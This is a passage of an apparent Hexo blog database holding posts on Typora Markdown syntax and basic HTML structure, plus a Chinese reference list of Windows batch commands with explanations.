inline link.\n\n[This link](http://example.net/) has no title attribute.</code></pre>\n<p>will produce:</p>\n<p>This is <a href=\"http://example.com/\" title=\"Title\">an example</a> inline link. (<code>&lt;p&gt;This is &lt;a href=&quot;http://example.com/&quot; title=&quot;Title&quot;&gt;</code>)</p>\n<p><a href=\"http://example.net/\">This link</a> has no title attribute. (<code>&lt;p&gt;&lt;a href=&quot;http://example.net/&quot;&gt;This link&lt;/a&gt; has no</code>)</p>\n<h4 id=\"Internal-Links\"><a href=\"#Internal-Links\" class=\"headerlink\" title=\"Internal Links\"></a>Internal Links</h4><p><strong>You can set the href to headers</strong>, which will create a bookmark that allow you to jump to that section after clicking. For example:</p>\n<p>Command(on Windows: Ctrl) + Click <a href=\"#block-elements\">This link</a> will jump to header <code>Block Elements</code>. To see how to write that, please move cursor or click that link with <code>⌘</code> key pressed to expand the element into markdown source.</p>\n<h4 id=\"Reference-Links\"><a href=\"#Reference-Links\" class=\"headerlink\" title=\"Reference Links\"></a>Reference Links</h4><p>Reference-style links use a second set of square brackets, inside which you place a label of your choosing to identify the link:</p>\n<pre><code class=\"markdown\">This is [an example][id] reference-style link.\n\nThen, anywhere in the document, you define your link label on a line by itself like this:\n\n[id]: http://example.com/  &quot;Optional Title Here&quot;</code></pre>\n<p>In Typora, they will be rendered like so:</p>\n<p>This is <a href=\"http://example.com/\" title=\"Optional Title Here\">an example</a> reference-style link.</p>\n<p>The implicit link name shortcut allows you to omit the name of the link, in which case the link text itself is used as the name. Just use an empty set of square brackets — for example, to link the word “Google” to the google.com web site, you could simply write:</p>\n<pre><code class=\"markdown\">[Google][]\nAnd then define the link:\n\n[Google]: http://google.com/</code></pre>\n<p>In Typora, clicking the link will expand it for editing, and command+click will open the hyperlink in your web browser.</p>\n<h3 id=\"URLs\"><a href=\"#URLs\" class=\"headerlink\" title=\"URLs\"></a>URLs</h3><p>Typora allows you to insert URLs as links, wrapped by <code>&lt;</code>brackets<code>&gt;</code>.</p>\n<p><code>&lt;i@typora.io&gt;</code> becomes <a href=\"mailto:&#105;&#x40;&#x74;&#x79;&#x70;&#111;&#x72;&#x61;&#46;&#105;&#111;\">&#105;&#x40;&#x74;&#x79;&#x70;&#111;&#x72;&#x61;&#46;&#105;&#111;</a>.</p>\n<p>Typora will also automatically link standard URLs. e.g: <a href=\"http://www.google.com\">www.google.com</a>.</p>\n<h3 id=\"Images\"><a href=\"#Images\" class=\"headerlink\" title=\"Images\"></a>Images</h3><p>Images have similar syntax as links, but they require an additional <code>!</code> char before the start of the link. The syntax for inserting an image looks like this:</p>\n<pre><code class=\"markdown\">![Alt text](/path/to/img.jpg)\n\n![Alt text](/path/to/img.jpg &quot;Optional title&quot;)</code></pre>\n<p>You are able to use drag &amp; drop to insert an image from an image file or your web browser. You can modify the markdown source code by clicking on the image. A relative path will be used if the image that is added using drag &amp; drop is in same directory or sub-directory as the document you’re currently editing.</p>\n<p>If you’re using markdown for building websites, you may specify a URL prefix for the image preview on your local computer with property <code>typora-root-url</code> in YAML Front Matters. For example, input <code>typora-root-url:/User/Abner/Website/typora.io/</code> in YAML Front Matters, and then <code>![alt](/blog/img/test.png)</code> will be treated as <code>![alt](file:///User/Abner/Website/typora.io/blog/img/test.png)</code> in Typora.</p>\n<p>You can find more details <a href=\"https://support.typora.io/Images/\">here</a>.</p>\n<h3 id=\"Emphasis\"><a href=\"#Emphasis\" class=\"headerlink\" title=\"Emphasis\"></a>Emphasis</h3><p>Markdown treats asterisks (<code>*</code>) and underscores (<code>_</code>) as indicators of emphasis. Text wrapped with one <code>*</code> or <code>_</code> will be wrapped with an HTML <code>&lt;em&gt;</code> tag. E.g:</p>\n<pre><code class=\"markdown\">*single asterisks*\n\n_single underscores_</code></pre>\n<p>output:</p>\n<p><em>single asterisks</em></p>\n<p><em>single underscores</em></p>\n<p>GFM will ignore underscores in words, which is commonly used in code and names, like this:</p>\n<blockquote>\n<p>wow_great_stuff</p>\n<p>do_this_and_do_that_and_another_thing.</p>\n</blockquote>\n<p>To produce a literal asterisk or underscore at a position where it would otherwise be used as an emphasis delimiter, you can backslash escape it:</p>\n<pre><code class=\"markdown\">\\*this text is surrounded by literal asterisks\\*</code></pre>\n<p>Typora recommends using the <code>*</code> symbol.</p>\n<h3 id=\"Strong\"><a href=\"#Strong\" class=\"headerlink\" title=\"Strong\"></a>Strong</h3><p>A double <code>*</code> or <code>_</code> will cause its enclosed contents to be wrapped with an HTML <code>&lt;strong&gt;</code> tag, e.g:</p>\n<pre><code class=\"markdown\">**double asterisks**\n\n__double underscores__</code></pre>\n<p>output:</p>\n<p><strong>double asterisks</strong></p>\n<p><strong>double underscores</strong></p>\n<p>Typora recommends using the <code>**</code> symbol.</p>\n<h3 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h3><p>To indicate an inline span of code, wrap it with backtick quotes (`). Unlike a pre-formatted code block, a code span indicates code within a normal paragraph. For example:</p>\n<pre><code class=\"markdown\">Use the `printf()` function.</code></pre>\n<p>will produce:</p>\n<p>Use the <code>printf()</code> function.</p>\n<h3 id=\"Strikethrough\"><a href=\"#Strikethrough\" class=\"headerlink\" title=\"Strikethrough\"></a>Strikethrough</h3><p>GFM adds syntax to create strikethrough text, which is missing from standard Markdown.</p>\n<p><code>~~Mistaken text.~~</code> becomes <del>Mistaken text.</del></p>\n<h3 id=\"Underlines\"><a href=\"#Underlines\" class=\"headerlink\" title=\"Underlines\"></a>Underlines</h3><p>Underline is powered by raw HTML.</p>\n<p><code>&lt;u&gt;Underline&lt;/u&gt;</code> becomes <u>Underline</u>.</p>\n<h3 id=\"Emoji-smile\"><a href=\"#Emoji-smile\" class=\"headerlink\" title=\"Emoji :smile:\"></a>Emoji :smile:</h3><p>Input emoji with syntax <code>:smile:</code>.</p>\n<p>User can trigger auto-complete suggestions for emoji by pressing <code>ESC</code> key, or trigger it automatically after enabling it on preference panel. Also, inputting UTF-8 emoji characters directly is also supported by going to <code>Edit</code> -&gt; <code>Emoji &amp; Symbols</code> in the menu bar (macOS).</p>\n<h3 id=\"Inline-Math\"><a href=\"#Inline-Math\" class=\"headerlink\" title=\"Inline Math\"></a>Inline Math</h3><p>To use this feature, please enable it first in the <code>Preference</code> Panel -&gt; <code>Markdown</code> Tab. Then, use <code>$</code> to wrap a TeX command. For example: <code>$\\lim_&#123;x \\to \\infty&#125; \\exp(-x) = 0$</code> will be rendered as LaTeX command.</p>\n<p>To trigger inline preview for inline math: input “$”, then press the <code>ESC</code> key, then input a TeX command.</p>\n<p>You can find more details <a href=\"https://support.typora.io/Math/\">here</a>.</p>\n<h3 id=\"Subscript\"><a href=\"#Subscript\" class=\"headerlink\" title=\"Subscript\"></a>Subscript</h3><p>To use this feature, please enable it first in the <code>Preference</code> Panel -&gt; <code>Markdown</code> Tab. Then, use <code>~</code> to wrap subscript content. For example: <code>H~2~O</code>, <code>X~long\\ text~</code>/</p>\n<h3 id=\"Superscript\"><a href=\"#Superscript\" class=\"headerlink\" title=\"Superscript\"></a>Superscript</h3><p>To use this feature, please enable it first in the <code>Preference</code> Panel -&gt; <code>Markdown</code> Tab. Then, use <code>^</code> to wrap superscript content. For example: <code>X^2^</code>.</p>\n<h3 id=\"Highlight\"><a href=\"#Highlight\" class=\"headerlink\" title=\"Highlight\"></a>Highlight</h3><p>To use this feature, please enable it first in the <code>Preference</code> Panel -&gt; <code>Markdown</code> Tab. Then, use <code>==</code> to wrap highlight content. For example: <code>==highlight==</code>.</p>\n<h2 id=\"HTML\"><a href=\"#HTML\" class=\"headerlink\" title=\"HTML\"></a>HTML</h2><p>You can use HTML to style content what pure Markdown does not support. For example, use <code>&lt;span style=&quot;color:red&quot;&gt;this text is red&lt;/span&gt;</code> to add text with red color.</p>\n<h3 id=\"Embed-Contents\"><a href=\"#Embed-Contents\" class=\"headerlink\" title=\"Embed Contents\"></a>Embed Contents</h3><p>Some websites provide iframe-based embed code which you can also paste into Typora. For example:</p>\n<pre><code class=\"Markdown\">&lt;iframe height=&#39;265&#39; scrolling=&#39;no&#39; title=&#39;Fancy Animated SVG Menu&#39; src=&#39;http://codepen.io/jeangontijo/embed/OxVywj/?height=265&amp;theme-id=0&amp;default-tab=css,result&amp;embed-version=2&#39; frameborder=&#39;no&#39; allowtransparency=&#39;true&#39; allowfullscreen=&#39;true&#39; style=&#39;width: 100%;&#39;&gt;&lt;/iframe&gt;</code></pre>\n<h3 id=\"Video\"><a href=\"#Video\" class=\"headerlink\" title=\"Video\"></a>Video</h3><p>You can use the <code>&lt;video&gt;</code> HTML tag to embed videos. For example:</p>\n<pre><code class=\"Markdown\">&lt;video src=&quot;xxx.mp4&quot; /&gt;</code></pre>\n<h3 id=\"Other-HTML-Support\"><a href=\"#Other-HTML-Support\" class=\"headerlink\" title=\"Other HTML Support\"></a>Other HTML Support</h3><p>You can find more details <a href=\"https://support.typora.io/HTML/\">here</a>.</p>"},{"title":"HTML","date":"2020-05-03T00:46:40.000Z","comments":1,"_content":"\n# HTML的基本结构\n\n```html\n<!DOCTYPE html>     #文档类型声明\n<html lang=\"en\">\n<head>\n\t<meta charest=\"UTF-8\">\n\t<title>网页标题</title>   #一个网页只有一个标题\n</head>\n<body>\n<!--网页内容，可以是文本或图像等-->\n</body>\n</html>\n```\n\n\n1. <head>\n\n- 下面标签可以用在head部分：<title>  , <meta> , <link> , <style>, <script>\n- <head> 标签中必须包含 <title>标签\n\n\n2. <meta>\n\n```\n常见的meta标签有\n1. keywords（关键字）keywords用来告诉搜索引擎你网页的关键字是什么\n2. description（网站内容描述）description用来告诉搜索引擎你网站的主要内容\n3. author（作者）标注网页的作者\n```\n\n# HTML中常用的标签\n\n![image-20200625194436236](/home/blacksheep/.config/Typora/typora-user-images/image-20200625194436236.png)\n\n- span无语义标签与div标签的区别：div标签可以自动换行，span标签不行","source":"_posts/Web前端_HTML.md","raw":"---\ntitle: HTML\ndate: 2020/5/3 8:46:40\ncomments: ture\ncategories:\n- Web前端\ntags:\n- HTML\n---\n\n# HTML的基本结构\n\n```html\n<!DOCTYPE html>     #文档类型声明\n<html lang=\"en\">\n<head>\n\t<meta charest=\"UTF-8\">\n\t<title>网页标题</title>   #一个网页只有一个标题\n</head>\n<body>\n<!--网页内容，可以是文本或图像等-->\n</body>\n</html>\n```\n\n\n1. <head>\n\n- 下面标签可以用在head部分：<title>  , <meta> , <link> , <style>, <script>\n- <head> 标签中必须包含 <title>标签\n\n\n2. <meta>\n\n```\n常见的meta标签有\n1. keywords（关键字）keywords用来告诉搜索引擎你网页的关键字是什么\n2. description（网站内容描述）description用来告诉搜索引擎你网站的主要内容\n3. author（作者）标注网页的作者\n```\n\n# HTML中常用的标签\n\n![image-20200625194436236](/home/blacksheep/.config/Typora/typora-user-images/image-20200625194436236.png)\n\n- span无语义标签与div标签的区别：div标签可以自动换行，span标签不行","slug":"Web前端_HTML","published":1,"updated":"2021-03-24T04:15:02.737Z","layout":"post","photos":[],"link":"","_id":"ckq3bl422000edsvtevykb2zd","content":"<h1 id=\"HTML的基本结构\"><a href=\"#HTML的基本结构\" class=\"headerlink\" title=\"HTML的基本结构\"></a>HTML的基本结构</h1><pre><code class=\"html\">&lt;!DOCTYPE html&gt;     #文档类型声明\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charest=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;网页标题&lt;/title&gt;   #一个网页只有一个标题\n&lt;/head&gt;\n&lt;body&gt;\n&lt;!--网页内容，可以是文本或图像等--&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre>\n<ol>\n<li><head>\n</li>\n</ol>\n<ul>\n<li>下面标签可以用在head部分：<title>  , <meta> , <link> , <style>, <script></li>\n<li><head> 标签中必须包含 <title>标签\n\n\n</li>\n</ul>\n<ol start=\"2\">\n<li><meta>\n\n</li>\n</ol>\n<pre><code>常见的meta标签有\n1. keywords（关键字）keywords用来告诉搜索引擎你网页的关键字是什么\n2. description（网站内容描述）description用来告诉搜索引擎你网站的主要内容\n3. author（作者）标注网页的作者</code></pre><h1 id=\"HTML中常用的标签\"><a href=\"#HTML中常用的标签\" class=\"headerlink\" title=\"HTML中常用的标签\"></a>HTML中常用的标签</h1><p><img \"\" class=\"lazyload placeholder\" data-original=\"/home/blacksheep/.config/Typora/typora-user-images/image-20200625194436236.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20200625194436236\"></p>\n<ul>\n<li>span无语义标签与div标签的区别：div标签可以自动换行，span标签不行</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"HTML的基本结构\"><a href=\"#HTML的基本结构\" class=\"headerlink\" title=\"HTML的基本结构\"></a>HTML的基本结构</h1><pre><code class=\"html\">&lt;!DOCTYPE html&gt;     #文档类型声明\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charest=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;网页标题&lt;/title&gt;   #一个网页只有一个标题\n&lt;/head&gt;\n&lt;body&gt;\n&lt;!--网页内容，可以是文本或图像等--&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre>\n<ol>\n<li><head>\n</li>\n</ol>\n<ul>\n<li>下面标签可以用在head部分：<title>  , <meta> , <link> , <style>, <script></li>\n<li><head> 标签中必须包含 <title>标签\n\n\n</li>\n</ul>\n<ol start=\"2\">\n<li><meta>\n\n</li>\n</ol>\n<pre><code>常见的meta标签有\n1. keywords（关键字）keywords用来告诉搜索引擎你网页的关键字是什么\n2. description（网站内容描述）description用来告诉搜索引擎你网站的主要内容\n3. author（作者）标注网页的作者</code></pre><h1 id=\"HTML中常用的标签\"><a href=\"#HTML中常用的标签\" class=\"headerlink\" title=\"HTML中常用的标签\"></a>HTML中常用的标签</h1><p><img src=\"/home/blacksheep/.config/Typora/typora-user-images/image-20200625194436236.png\" alt=\"image-20200625194436236\"></p>\n<ul>\n<li>span无语义标签与div标签的区别：div标签可以自动换行，span标签不行</li>\n</ul>\n"},{"_content":"---\n\n\n\n---\n\n# bat批处理命令及解释\n\n[相关原文链接](https://www.cnblogs.com/xpwi/p/9626959.html)\n\n## 一、批处理概念\n\n- 批处理文件：包含DOS命令的可编辑可执行文件\n- 批处理：可以对某一对象批量操作的文件\n\n<!--more-->\n\n## 二、批处理命令简介\n\n### 命令1~10\n\n```\n1 echo 和 @\n回显命令\n@  #关闭单行回显\necho off  #从下一行开始关闭回显\n@echo off  #从本行开始关闭回显。一般批处理第一行都是这个\necho on #从下一行开始打开回显\necho #显示当前是 echo off 状态还是 echo on 状态\necho. #输出一个”回车换行”，空白行\n#(同echo, echo; echo+ echo[ echo] echo/ echo)\n\n2 errorlevel\necho %errorlevel%\n每个命令运行结束，可以用这个命令行格式查看返回码\n默认值为0，一般命令执行出错会设 errorlevel 为1\n\n3 dir\n显示文件夹内容\ndir #显示当前目录中的文件和子目录\ndir /a #显示当前目录中的文件和子目录，包括隐藏文件和系统文件\ndir c: /a:d #显示 C 盘当前目录中的目录\ndir c: /a:-d #显示 C 盘根目录中的文件\ndir c: /b/p #/b只显示文件名，/p分页显示\ndir *.exe /s #显示当前目录和子目录里所有的.exe文件\n\n4 cd\n切换目录\ncd #进入根目录\ncd #显示当前目录\ncd /d d:sdk #可以同时更改盘符和目录\n\n5 md\n创建目录\nmd d:abc #如果 d:a 不存在，将会自动创建中级目录\n#如果命令扩展名被停用，则需要键入 mkdir abc\n\n6 rd\n删除目录\nrd abc #删除当前目录里的 abc 子目录，要求为空目录\nrd /s/q d:temp #删除 d:temp 文件夹及其子文件夹和文件，/q安静模式\n\n7 del\n删除文件\ndel d:test.txt #删除指定文件，不能是隐藏、系统、只读文件\ndel /q/a/f d:temp*.*\n删除 d:temp 文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录\ndel /q/a/f/s d:temp*.*\n删除 d:temp 及子文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录\n\n8 ren\n重命名命令\nren d:temp tmp #支持对文件夹的重命名\n\n9 cls\n清屏\n10 type\n显示文件内容\ntype c:boot.ini #显示指定文件的内容，程序文件一般会显示乱码\ntype *.txt #显示当前目录里所有.txt文件的内容\n\n\n```\n\n### 命令11~20\n\n```\n11 copy\n拷贝文件\ncopy c:test.txt d:test.bak\n复制 c:test.txt 文件到 d: ，并重命名为 test.bak\ncopy con test.txt\n从屏幕上等待输入，按 Ctrl+Z 结束输入，输入内容存为test.txt文件\ncon代表屏幕，prn代表打印机，nul代表空设备\ncopy 1.txt + 2.txt 3.txt\n合并 1.txt 和 2.txt 的内容，保存为 3.txt 文件\n如果不指定 3.txt ，则保存到 1.txt\ncopy test.txt +\n复制文件到自己，实际上是修改了文件日期\n\n12 title\n设置cmd窗口的标题\ntitle 新标题 #可以看到cmd窗口的标题栏变了\n\n13 ver\n显示系统版本\n\n14 label 和 vol\n设置卷标\nvol #显示卷标\nlabel #显示卷标，同时提示输入新卷标\nlabel c:system #设置C盘的卷标为 system\n\n15 pause\n暂停命令 //常用于使命令行窗口暂停，不至于打开bat文件后立即结束\n\n16 rem 和 ::\n注释命令\n注释行不执行操作\n\n17 date 和 time\n日期和时间\ndate #显示当前日期，并提示输入新日期，按\"回车\"略过输入\ndate/t #只显示当前日期，不提示输入新日期\ntime #显示当前时间，并提示输入新时间，按\"回车\"略过输入\ntime/t #只显示当前时间，不提示输入新时间\n\n18 goto 和 :\n跳转命令\n:label #行首为:表示该行是标签行，标签行不执行操作\ngoto label #跳转到指定的标签那一行\n\n19 find (外部命令)\n查找命令\nfind \"abc\" c:test.txt\n在 c:test.txt 文件里查找含 abc 字符串的行\n如果找不到，将设 errorlevel 返回码为1\nfind /i “abc” c:test.txt\n查找含 abc 的行，忽略大小写\nfind /c \"abc\" c:test.txt\n显示含 abc 的行的行数\n\n20 more (外部命令)\n逐屏显示\nmore c:test.txt #逐屏显示 c:test.txt 的文件内容\n```\n\n\n\n### 命令21~30\n\n```\n21 tree\n显示目录结构\ntree d: #显示D盘的文件目录结构\n\n22 &\n顺序执行多条命令，而不管命令是否执行成功\n\n23 &&\n顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令\nfind \"ok\" c:test.txt && echo 成功\n如果找到了\"ok\"字样，就显示\"成功\"，找不到就不显示\n\n24 ||\n顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令\nfind \"ok\" c:test.txt || echo 不成功\n如果找不到\"ok\"字样，就显示\"不成功\"，找到了就不显示\n\n25 |\n管道命令\ndir *.* /s/a | find /c \".exe\"\n管道命令表示先执行 dir 命令，对其输出的结果执行后面的 find 命令\n该命令行结果：输出当前文件夹及所有子文件夹里的.exe文件的个数\ntype c:test.txt|more\n这个和 more c:test.txt 的效果是一样的\n\n26 > 和 >>\n输出重定向命令\n> 清除文件中原有的内容后再写入\n>> 追加内容到文件末尾，而不会清除原有的内容\n主要将本来显示在屏幕上的内容输出到指定文件中\n指定文件如果不存在，则自动生成该文件\ntype c:test.txt >prn\n屏幕上不显示文件内容，转向输出到打印机\necho hello world>con\n在屏幕上显示hello world，实际上所有输出都是默认 >con 的\ncopy c:test.txt f: >nul\n拷贝文件，并且不显示\"文件复制成功\"的提示信息，但如果f盘不存在，还是会显示出错信息\ncopy c:test.txt f: >nul 2>nul\n不显示”文件复制成功”的提示信息，并且f盘不存在的话，也不显示错误提示信息\necho ^^W ^> ^W>c:test.txt\n生成的文件内容为 ^W > W\n^ 和 > 是控制命令，要把它们输出到文件，必须在前面加个 ^ 符号\n\n27 <\n从文件中获得输入信息，而不是从屏幕上\n一般用于 date time label 等需要等待输入的命令\n@echo off\necho 2005-05-01>temp.txt\ndate <temp.txt\ndel temp.txt\n这样就可以不等待输入直接修改当前日期\n\n28 %0 %1 %2 %3 %4 %5 %6 %7 %8 %9 %*\n命令行传递给批处理的参数  //上一个命令的结果作为参数\n%0 批处理文件本身\n%1 第一个参数\n%9 第九个参数\n%* 从第一个参数开始的所有参数\n批参数(%n)的替代已被增强。您可以使用以下语法:\n%~1 - 删除引号(\" )， 扩充 %1\n%~f1 - 将 %1 扩充到一个完全合格的路径名\n%~d1 - 仅将 %1 扩充到一个驱动器号\n%~p1 - 仅将 %1 扩充到一个路径\n%~n1 - 仅将 %1 扩充到一个文件名\n%~x1 - 仅将 %1 扩充到一个文件扩展名\n%~s1 - 扩充的路径指含有短名\n%~a1 - 将 %1 扩充到文件属性\n%~t1 - 将 %1 扩充到文件的日期/时间\n%~z1 - 将 %1 扩充到文件的大小\n%~$PATH : 1 - 查找列在 PATH 环境变量的目录，并将 %1\n扩充到找到的第一个完全合格的名称。如果环境\n变量名未被定义，或者没有找到文件，此组合键会\n扩充到空字符串\n可以组合修定符来取得多重结果:\n%~dp1 - 只将 %1 扩展到驱动器号和路径\n%~nx1 - 只将 %1 扩展到文件名和扩展名\n%~dp$PATH:1 - 在列在 PATH 环境变量中的目录里查找 %1，\n并扩展到找到的第一个文件的驱动器号和路径。\n%~ftza1 - 将 %1 扩展到类似 DIR 的输出行。\n可以参照 call/? 或 for/? 看出每个参数的含意\necho load \"%%1\" \"%%2\">c:test.txt\n生成的文件内容为 load \"%1\"  \"%2\"\n批处理文件里，用这个格式把命令行参数输出到文件\n\n29 if\n判断命令\nif \"%1\"==\"/a\" echo 第一个参数是/a\nif /i \"%1\" equ \"/a\" echo 第一个参数是/a\n/i 表示不区分大小写，equ 和 == 是一样的，其它运算符参见 if/?\nif exist c:test.bat echo 存在c:test.bat文件\nif not exist c:windows (\necho 不存在c:windows文件夹\n)\nif exist c:test.bat (\necho 存在c:test.bat\n) else (\necho 不存在c:test.bat\n)\n30 setlocal 和 endlocal\n设置”命令扩展名”和”延缓环境变量扩充”\nSETLOCAL ENABLEEXTENSIONS #启用\"命令扩展名\"\nSETLOCAL DISABLEEXTENSIONS #停用\"命令扩展名\"\nSETLOCAL ENABLEDELAYEDEXPANSION #启用\"延缓环境变量扩充\"\nSETLOCAL DISABLEDELAYEDEXPANSION #停用\"延缓环境变量扩充\"\nENDLOCAL #恢复到使用SETLOCAL语句以前的状态\n“命令扩展名”默认为启用\n“延缓环境变量扩充”默认为停用\n批处理结束系统会自动恢复默认值\n可以修改注册表以禁用\"命令扩展名\"，详见 cmd /? 。所以用到\"命令扩展名\"的程\n序，建议在开头和结尾加上 SETLOCAL ENABLEEXTENSIONS 和 ENDLOCAL 语句，以确\n保程序能在其它系统上正确运行\n\"延缓环境变量扩充\"主要用于 if 和 for 的符合语句，在 set 的说明里有其实用例程\n```\n\n### 命令31~39\n\n```\n31 set\n设置变量\n引用变量可在变量名前后加 % ，即 %变量名%\nset #显示目前所有可用的变量，包括系统变量和自定义的变量\necho %SystemDrive% #显示系统盘盘符。系统变量可以直接引用\nset p #显示所有以p开头的变量，要是一个也没有就设errorlevel=1\nset p=aa1bb1aa2bb2 #设置变量p，并赋值为 = 后面的字符串，即aa1bb1aa2bb2\necho %p% #显示变量p代表的字符串，即aa1bb1aa2bb2\necho %p:~6% #显示变量p中第6个字符以后的所有字符，即aa2bb2\necho %p:~6,3% #显示第6个字符以后的3个字符，即aa2\necho %p:~0,3% #显示前3个字符，即aa1\necho %p:~-2% #显示最后面的2个字符，即b2\necho %p:~0,-2% #显示除了最后2个字符以外的其它字符，即aa1bb1aa2b\necho %p:aa=c% #用c替换变量p中所有的aa，即显示c1bb1c2bb2\necho %p:aa=% #将变量p中的所有aa字符串置换为空，即显示1bb12bb2\necho %p:*bb=c% #第一个bb及其之前的所有字符被替换为c，即显示c1aa2bb2\nset p=%p:*bb=c% #设置变量p，赋值为 %p:*bb=c% ，即c1aa2bb2\nset /a p=39 #设置p为数值型变量，值为39\nset /a p=39/10 #支持运算符，有小数时用去尾法，39/10=3.9，去尾得3，p=3\nset /a p=p/10 #用 /a 参数时，在 = 后面的变量可以不加%直接引用\nset /a p=”1&0″ #”与”运算，要加引号。其它支持的运算符参见set/?\nset p= #取消p变量\nset /p p=请输入\n屏幕上显示”请输入”，并会将输入的字符串赋值给变量p\n注意这条可以用来取代 choice 命令\n注意变量在 if 和 for 的复合语句里是一次性全部替换的，如\n@echo off\nset p=aaa\nif %p%==aaa (\necho %p%\nset p=bbb\necho %p%\n)\n结果将显示\naaa\naaa\n因为在读取 if 语句时已经将所有 %p% 替换为aaa\n这里的\"替换\"，在 /? 帮助里就是指\"扩充\"、\"环境变量扩充\"\n可以启用”延缓环境变量扩充”，用 ! 来引用变量，即 !变量名!\n@echo off\nSETLOCAL ENABLEDELAYEDEXPANSION\nset p=aaa\nif %p%==aaa (\necho %p%\nset p=bbb\necho !p!\n)\nENDLOCAL\n结果将显示\naaa\nbbb\n还有几个动态变量，运行 set 看不到\n%CD% #代表当前目录的字符串\n%DATE% #当前日期\n%TIME% #当前时间\n%RANDOM% #随机整数，介于0~32767\n%ERRORLEVEL% #当前 ERRORLEVEL 值\n%CMDEXTVERSION% #当前命令处理器扩展名版本号\n%CMDCMDLINE% #调用命令处理器的原始命令行\n可以用echo命令查看每个变量值，如 echo %time%\n注意 %time% 精确到毫秒，在批处理需要延时处理时可以用到\n\n32 start\n批处理中调用外部程序的命令，否则等外部程序完成后才继续执行剩下的指令\n\n33 call\n批处理中调用另外一个批处理的命令，否则剩下的批处理指令将不会被执行\n有时有的应用程序用start调用出错的，也可以call调用\n\n34 choice (外部命令)\n选择命令\n让用户输入一个字符，从而选择运行不同的命令，返回码errorlevel为1234……\nwin98里是choice.com\nwin2000pro里没有，可以从win98里拷过来\nwin2003里是choice.exe\nchoice /N /C y /T 5 /D y>nul\n延时5秒\n\n35 assoc 和 ftype\n文件关联\nassoc 设置'文件扩展名'关联，关联到'文件类型'\nftype 设置'文件类型'关联，关联到'执行程序和参数'\n当你双击一个.txt文件时，windows并不是根据.txt直接判断用 notepad.exe 打开\n而是先判断.txt属于 txtfile '文件类型'\n再调用 txtfile 关联的命令行 txtfile=%SystemRoot%system32NOTEPAD.EXE %1\n可以在\"文件夹选项\"→\"文件类型\"里修改这2种关联\nassoc #显示所有'文件扩展名'关联\nassoc .txt #显示.txt代表的'文件类型'，结果显示 .txt=txtfile\nassoc .doc #显示.doc代表的'文件类型'，结果显示 .doc=Word.Document.8\nassoc .exe #显示.exe代表的'文件类型'，结果显示 .exe=exefile\nftype #显示所有'文件类型'关联\nftype exefile #显示exefile类型关联的命令行，结果显示 exefile=\"%1\" %*\nassoc .txt=Word.Document.8\n设置.txt为word类型的文档，可以看到.txt文件的图标都变了\nassoc .txt=txtfile\n恢复.txt的正确关联\nftype exefile=\"%1\" %*\n恢复 exefile 的正确关联\n如果该关联已经被破坏，可以运行 command.com ，再输入这条命令\n\n36 pushd 和 popd\n切换当前目录\n@echo off\nc: & cd & md mp3 #在 C: 建立 mp3 文件夹\nmd d:mp4 #在 D: 建立 mp4 文件夹\ncd /d d:mp4 #更改当前目录为 d:mp4\npushd c:mp3 #保存当前目录，并切换当前目录为 c:mp3\npopd #恢复当前目录为刚才保存的 d:mp4\n\n37 for\n循环命令\n这个比较复杂，请对照 for/? 来看\nfor %%i in (c: d: e: f:) do echo %%i\n依次调用小括号里的每个字符串，执行 do 后面的命令\n注意%%i，在批处理中 for 语句调用参数用2个%\n默认的字符串分隔符是\"空格键\"，\"Tab键\"，\"回车键\"\nfor %%i in (*.txt) do find \"abc\" %%i\n对当前目录里所有的txt文件执行 find 命令\nfor /r . %%i in (*.txt) do find \"abc\" %%i\n在当前目录和子目录里所有的.txt文件中搜索包含 abc 字符串的行\nfor /r . %%i in (.) do echo %%~pni\n显示当前目录名和所有子目录名，包括路径，不包括盘符\nfor /r d:mp3 %%i in (*.mp3) do echo %%i>>d:mp3.txt\n把 d:mp3 及其子目录里的mp3文件的文件名都存到 d:mp3.txt 里去\nfor /l %%i in (2,1,8) do echo %%i\n生成2345678的一串数字，2是数字序列的开头，8是结尾，1表示每次加1\nfor /f %%i in ('set') do echo %%i\n对 set 命令的输出结果循环调用，每行一个\nfor /f \"eol=P\" %%i in ('set') do echo %%i\n取 set 命令的输出结果，忽略以 P 开头的那几行\nfor /f %%i in (d:mp3.txt) do echo %%i\n显示 d:mp3.txt 里的每个文件名，每行一个，不支持带空格的名称\nfor /f \"delims=\" %%i in (d:mp3.txt) do echo %%i\n显示 d:mp3.txt 里的每个文件名，每行一个，支持带空格的名称\nfor /f \"skip=5 tokens=4\" %%a in ('dir') do echo %%a\n对 dir 命令的结果，跳过前面5行，余下的每行取第4列\n每列之间的分隔符为默认的\"空格\"\n可以注意到 dir 命令输出的前5行是没有文件名的\nfor /f \"tokens=1,2,3 delims=- \" %%a in ('date /t') do (\necho %%a\necho %%b\necho %%c\n)\n对 date /t 的输出结果，每行取1、2、3列\n第一列对应指定的 %%a ，后面的 %%b 和 %%c 是派生出来的，对应其它列\n分隔符指定为 - 和\"空格\"，注意 delims=- 后面有个\"空格\"\n其中 tokens=1,2,3 若用 tokens=1-3 替换，效果是一样的\nfor /f \"tokens=2* delims=- \" %%a in ('date /t') do echo %%b\n取第2列给 %%a ，其后的列都给 %%b\n\n38 subst (外部命令)\n映射磁盘。\nsubst z: serverd #这样输入z:就可以访问serverd了\nsubst z: /d #取消该映射\nsubst #显示目前所有的映时\n\n39 xcopy (外部命令)\n文件拷贝\nxcopy d:mp3 e:mp3 /s/e/i/y\n复制 d:mp3 文件夹、所有子文件夹和文件到 e: ，覆盖已有文件\n加 /i 表示如果 e: 没有 mp3 文件夹就自动新建一个，否则会有询问\n```\n\n","source":"_posts/bat批处理文件.md","raw":"---\n\n\n\n---\n\n# bat批处理命令及解释\n\n[相关原文链接](https://www.cnblogs.com/xpwi/p/9626959.html)\n\n## 